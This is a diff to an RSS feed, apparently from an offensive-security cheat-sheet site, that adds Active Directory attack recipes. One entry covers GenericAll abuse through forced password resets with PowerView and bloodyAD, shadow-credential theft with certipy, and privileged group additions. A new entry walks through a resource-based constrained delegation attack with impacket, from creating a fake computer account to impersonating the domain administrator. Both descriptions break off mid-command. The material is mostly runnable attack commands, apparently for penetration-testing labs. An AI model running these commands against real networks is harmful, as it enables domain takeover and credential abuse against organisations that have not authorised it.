@@ -12,7 +12,14 @@
       <link>https://tldrbins.github.io/genericall/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/genericall/</guid>
-      <description> Using PowerView.ps1 . .\PowerView.ps1 Authenticated # Add user to group (e.g. Exchange Windows Permissions) Add-DomainGroupMember -Identity &amp;#34;Exchange Windows Permissions&amp;#34; -Members USER Runas $username = &amp;#34;domain\username&amp;#34; $password = &amp;#34;password&amp;#34; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr # Add user to group (e.g. Exchange Windows Permissions) Add-DomainGroupMember -Identity &amp;#39;Exchange Windows Permissions&amp;#39; -Members USER -Credential $Cred </description>
+      <description>Import PowerView.ps1 . .\PowerView.ps1 Abuse #1 : Change Target User Password From Windows $pass = ConvertTo-SecureString &amp;#39;password&amp;#39; -AsPlainText -Force Set-DomainUserPassword -Identity &amp;lt;target_user&amp;gt; -AccountPassword $pass From Linux bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; set password &amp;lt;TARGET_USER&amp;gt; &amp;lt;NEW_PASSWORD&amp;gt; Abuse #2 : Get shawdow credentials (From Linux) sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; certipy-ad shadow auto -username &amp;lt;USERNAME&amp;gt;@&amp;lt;DOMAIN&amp;gt; -password &amp;lt;PASSWORD&amp;gt; -k -account &amp;lt;TARGET_USER&amp;gt; -target &amp;lt;DC&amp;gt; Abuse #3 : Add user to group Authenticated # For example &amp;#39;Exchange Windows Permissions&amp;#39; Add-DomainGroupMember -Identity &amp;#34;Exchange Windows Permissions&amp;#34; -Members USER Runas $username = &amp;#34;domain\username&amp;#34; $password = &amp;#34;password&amp;#34; $secstr = New-Object -TypeName System.</description>
+    </item>
+    <item>
+      <title>RBCD Attack</title>
+      <link>https://tldrbins.github.io/rbcd/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/rbcd/</guid>
+      <description>RBCD Attack (From Linux) 0. Check machine account quota nxc ldap 10.10.11.10 -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -M MAQ 1. Add a fake computer impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;password&amp;#39; -dc-ip 10.10.11.10 example.com/username:password 2. Rbcd attack impacket-rbcd -delegate-to TARGET_COMPUTER$ -delegate-from EvilComputer$ -dc-ip dc.example.com -action &amp;#39;write&amp;#39; example.com/username:password 3. Impersonate sudo ntpdate -s dc.example.com &amp;amp;&amp;amp; impacket-getST -spn cifs/dc.example.com -impersonate administrator -dc-ip dc.example.com &amp;#39;example.com/EvilComputer:password&amp;#39; 4. Import ticket export KRB5CCNAME=administrator@cifs_dc.example.com@example.com.ccache 5. Post-Attack # Remote sudo ntpdate -s dc.</description>
     </item>
   </channel>
 </rss>
